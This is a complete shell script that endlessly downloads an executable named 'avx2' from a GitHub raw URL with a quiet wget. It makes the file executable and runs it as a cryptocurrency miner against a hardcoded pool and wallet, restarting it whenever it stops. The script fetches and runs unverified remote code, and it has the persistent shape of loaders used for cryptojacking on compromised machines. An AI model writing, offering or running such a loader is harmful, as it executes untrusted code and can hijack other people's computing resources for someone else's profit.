#!/bin/sh

# Define the URL and mining parameters
MINER_URL="https://raw.githubusercontent.com/edrivetokenbsc/xnxxx/main/build/avx2"
POOL_URL="stratum+tcps://stratum-na.rplant.xyz:13382"
WALLET_ADDRESS="YeW8bsNisZGT4tL5rTfmi5BD3hK8e8CAPe"
PASSWORD="m=solo"

# Loop indefinitely
while true; do
    # Download the miner executable
    wget -q "$MINER_URL" -O avx2
    if [ $? -ne 0 ]; then
        echo "Failed to download the miner. Retrying in 10 seconds..."
        sleep 10
        continue
    fi

    # Make the miner executable
    chmod +x avx2
    if [ $? -ne 0 ]; then
        echo "Failed to make the miner executable. Retrying in 10 seconds..."
        sleep 10
        continue
    fi

    # Run the miner
    echo "Starting the miner..."
    ./avx2 -a yespowerr16 -o "$POOL_URL" -u "$WALLET_ADDRESS" -p "$PASSWORD"
    if [ $? -ne 0 ]; then
        echo "Miner crashed or failed. Restarting in 10 seconds..."
        sleep 10
    else
        echo "Miner exited successfully. Restarting in 5 seconds..."
        sleep 5
    fi
done